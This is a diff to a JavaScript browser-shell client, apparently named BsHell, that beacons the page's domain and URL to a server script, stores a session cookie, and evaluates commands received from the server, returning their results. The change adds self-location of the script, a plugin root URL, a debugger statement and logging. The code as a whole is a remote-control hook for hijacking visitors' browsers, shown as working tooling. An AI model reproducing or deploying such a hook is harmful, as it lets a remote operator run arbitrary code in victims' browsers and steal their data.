@@ -34,9 +34,8 @@ if(typeof JSON == "undefined") {
     
     self.url = "bshell.php";
     if(options.url)
-	self.url=options.url;
+	self.url = options.url;
     self.options = options;
-
     self.plugins = {};
     self.timer = false;
     self.stopped = false;
@@ -108,12 +107,24 @@ if(typeof JSON == "undefined") {
 	xhr.send(null);
     }
     
+    this.detectSelf = function() {
+	if(typeof self.script_location != "string") {
+	    for(var scr in document.scripts) {
+		if(/bshell\.js/.test(document.scripts[scr].src)) {
+		    self.script_location = document.scripts[scr].src;
+		    self.log("detected myself at " + self.script_location);
+		}
+	    }
+	}
+	return self.script_location;
+    };
+
     this.resumeSession = function() {
 	var cook = self.readCookie("BsHell");
 	if(cook) {
 	    self.sessionId = cook;
 	    self.log("resumed session from cookie:" + self.sessionId);
-	    return true;
+ 	    return true;
 	}
 	return false;
     };
@@ -141,6 +152,7 @@ if(typeof JSON == "undefined") {
     
     this.start = function() {
 	self.log("starting BsHell");
+	self.detectSelf();
 	var packet = {
 	    domain: document.domain,
 	    page: document.location.href
@@ -208,6 +220,7 @@ if(typeof JSON == "undefined") {
 		var ret={}, res = false;
 		try {
 		    var bshell = {
+			root_url: self.script_location.substr(0, self.script_location.lastIndexOf("/")+1),
 			plugins: self.plugins,
 			send: function(data) {
 			    setTimeout(function() {self.send({cmd: "result", id: cmdId, response: data});},10);
@@ -229,8 +242,10 @@ if(typeof JSON == "undefined") {
 		    eval("res = " + cod);
 		    ret.response = res;
 		} catch(e) {
+		    debugger;
 		    ret={error: e.message};
 		}
+		self.log("result from code: ", ret);
 		
 		if(ret.response != false && typeof ret.response != "undefined") {
 		    ret.id = cmdId;
